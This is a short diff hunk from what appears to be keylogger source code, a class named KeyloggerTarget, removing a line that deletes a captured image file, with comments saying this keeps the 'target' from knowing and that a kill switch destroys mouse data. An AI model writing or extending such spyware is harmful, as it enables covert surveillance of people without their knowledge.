@@ -182,8 +182,6 @@ class KeyloggerTarget:
             if os.path.exists("Image.png"):
                 # It will destroy the image so target wound know anything
                 fhandle.close()
-                os.remove("Image.png")
-            # This removes the image
 
     def kill_switch(self):
         # This function destroys the mouse info
